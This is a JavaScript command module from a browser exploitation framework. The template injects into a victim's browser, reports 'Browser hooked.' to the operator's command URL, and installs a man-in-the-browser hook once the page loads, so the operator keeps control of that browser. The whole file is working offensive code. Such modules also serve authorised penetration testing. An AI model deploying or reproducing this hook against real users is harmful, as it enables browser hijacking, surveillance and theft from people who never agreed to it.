/*
 * Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (Server) - https://serverproject.com
 * See the file 'doc/COPYING' for copying permission
 */

server.execute(function() {
	try{
		server.net.send("<%= @command_url %>", <%= @command_id %>, "Browser hooked.");
		server.mitb.init("<%= @command_url %>", <%= @command_id %>);
		var MITBload = setInterval(function(){
				if(server.pageIsLoaded){
					clearInterval(MITBload);
					server.mitb.hook();
				}
			}, 100);
	}catch(e){
		server.net.send("<%= @command_url %>", <%= @command_id %>, "Failed to hook browser: " + e.message);
	}
});